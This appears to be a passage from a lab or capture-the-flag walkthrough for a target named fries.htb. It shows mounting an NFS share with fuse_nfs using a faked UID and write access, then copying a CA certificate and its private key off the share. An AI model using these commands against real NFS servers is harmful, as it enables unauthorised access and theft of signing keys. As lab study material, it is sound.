From the previous step you have discovered a client, so now you have to mount it to access its content.

Connected clients reported by mountd:
*Client                          Export*              
*192.168.100.2(down)  /srv/web.fries.htb*  

## fuse_nfs

#Attacking_machine 
- On a new terminal run:

``` 
mkdir /tmp/nfs_mount
fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2 
```

![[fuse_nfs.png]]

The share has been mounted on */tmp/nfs_mount*.

#Attacking_machine 
- Open another terminal and run:

```
ls -la /tmp/nfs_mount
```

#Attacking_machine 
- Access files inside `certs/` without entering it.

```
ls -l /tmp/nfs_mount/certs
```

### Copy the files directly to the attacking machine

Even without traversal permissions, NFS allows file operations if you reference the full path:

#Attacking_machine 

```
cp /tmp/nfs_mount/certs/ca.pem .
cp /tmp/nfs_mount/certs/ca-key.pem .
```
